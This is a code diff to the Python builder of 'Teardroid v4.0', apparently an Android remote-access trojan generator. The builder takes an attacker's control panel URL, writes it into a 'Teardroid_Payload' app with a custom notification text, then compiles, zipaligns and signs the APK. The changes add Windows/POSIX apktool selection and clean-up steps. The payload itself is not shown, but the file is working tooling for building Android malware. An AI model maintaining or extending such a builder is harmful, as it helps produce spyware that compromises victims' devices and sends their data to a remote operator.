@@ -15,7 +15,7 @@ from colorama import Fore, Style
 
 
 class Config(BaseModel):
-    apktool: str = os.path.join(os.getcwd(),"apktool.sh")
+    apktool: str = os.path.join(os.getcwd(), "apktool.sh")
     version: str = 'Teardroid v4.0'
     current_dir: str = os.getcwd()
 
@@ -38,6 +38,7 @@ def banner() -> Str:
 
 
 def builder(name: str) -> None:
+    APKTOOL = None
     try:
         url = input("Control Panel URL : ")
         NotificationText = input("Notification Title : ")
@@ -46,13 +47,22 @@ def builder(name: str) -> None:
     except:
         sys.exit(0)
         print("GoodBye")
+        
     Teardroid = TeardroidBuilder(name)
+    if os.path.isfile(name + ".apk"):
+        Teardroid.print_result("Removing old APK")
+        os.remove(name + ".apk")
     Teardroid.changeAppname()
     Teardroid.changeHostname(url)
     Teardroid.changeNotification(
         NotificationText, NotificationContent, NotificationSubText)
     Teardroid.print_result("Compiling Teardroid using apktool")
-    os.system("./apktool.sh b Teardroid_Payload -o " + name + "_uncompressed.apk")
+    
+    if Teardroid.os == "posix":
+        APKTOOL = os.path.join(os.getcwd(), "apktool.sh")
+    else:
+        APKTOOL = os.path.join(os.getcwd(), "apktool.bat")
+    os.system(APKTOOL + " b Teardroid_Payload -o " + name + "_uncompressed.apk")
     Teardroid.print_result("Compiling Teardroid completed")
     Teardroid.print_result("Compressing APK Files using zipalign")
     Teardroid.CompressAPK()
@@ -60,7 +70,8 @@ def builder(name: str) -> None:
     Teardroid.SingAPK()
     Teardroid.Clear()
     Teardroid.print_result("Proccess Completed Successfully")
-    Teardroid.print_result("Saved as " + os.path.join(os.getcwd(),name,".apk"))
+    Teardroid.print_result(
+        "Saved as " + os.path.join(os.getcwd(), name + ".apk"))
 
 
 if __name__ == '__main__':
